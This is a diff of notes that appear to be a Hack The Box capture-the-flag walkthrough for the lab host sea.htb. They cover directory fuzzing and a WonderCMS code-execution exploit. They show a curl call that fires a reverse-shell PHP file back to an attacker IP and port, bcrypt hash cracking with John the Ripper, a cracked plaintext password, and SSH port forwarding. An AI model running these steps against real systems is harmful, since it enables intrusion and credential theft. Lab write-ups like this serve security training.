@@ -2,8 +2,6 @@
 2024-08-17 13:23
 
 Source: #htb #CTF 
-
-Tags: [[burpsuite]]
 ### Reconnaissance 
 
 - `nmap` scan shows `22/tcp ssh` & `80/tcp http`
@@ -17,7 +15,8 @@ trying out XSS payloads don't really do anything
 #### using Dirbuster
 
 open the GUI version of Dirbuster and check the `use Blank Extension` box this will find sub-directories of sub-directories. we find `/themes/bike` gets `301` response. 
-#### Alternate using [[ffuf]] : 
+#### Alternate using [[ffuf]] 
+
 ```bash
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://sea.htb/FUZZ
 ```
@@ -36,22 +35,43 @@ on running `ffuf` again we find a `/bike` directory that has a `301` response.
 - above in the dirbuster results we saw a `themes/bike/version` directory that gives us the version of the CMS on visiting the URL.
 ### Exploit
 
-- Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 allows a remote attacker to execute arbitrary code via a crafted script uploaded to the `installModule` component.
+Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 allows a remote attacker to execute arbitrary code via a crafted script uploaded to the `installModule` component.
 - we can get the script for this from github 
 
-running the exploit and having a netcat listener open doesn't give us a shell 
+- running the exploit and having a netcat listener open doesn't give us a shell 
+- we somehow have to trigger the `rev.php` file to make target server’s connection with our machine so, lets run this command in another terminal while having the listener on
 
+I saw this line mentioned multiple times in the code `(“GET”, urlWithoutLogBase+”/themes/revshell-main/rev.php”)` So I just put target URL and gave it a shot!
+```shell
+curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.57&lport=4444'
+```
 
+- we have `amay` and `geo` in the home directory 
+- without further ado we run `Linpeas` on this 
+- in the interesting files section we find a `/var/www/sea/data/database.js`
+- on opening this file we find a password hash (possibly amay's ssh password)
 
+[[Cryptography]] before running john through the password we need to reformat it by removing `\` in order to crack it successfully. use John The Ripper
+```shell
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt filename.txt
+```
+### Privilege Escalation 
 
+Run `Linpeas`... we don't really find anything
+I then decided to check if there is anything on Amay’s local host. To do that there is a technique called [[Port Forwarding]]. It basically takes a user’s port and redirect it’s traffic to our port. run the following on your local machine 
+```
+ssh -L 4444:localhost:8080 amay@sea.htb
+```
+If you’re logged in, you’re good to go. If not, check what’s running on your localhost:4444 you can check that by this command:
+```
+sudo lsof -i :4444
+```
+If you see some other services, kill the PID and then try the [[ssh]] command again.
 
+go to `localhost:4444` in your local browser and login with username as amay and password as mychemicalromance(cracked hash password)
 
-
-
-
-
-
-
+we see a system monitoring page that is under development and we also see a analyze button that analyses the log files 
+keep [[burpsuite]] on for rest of the process
 
 
 
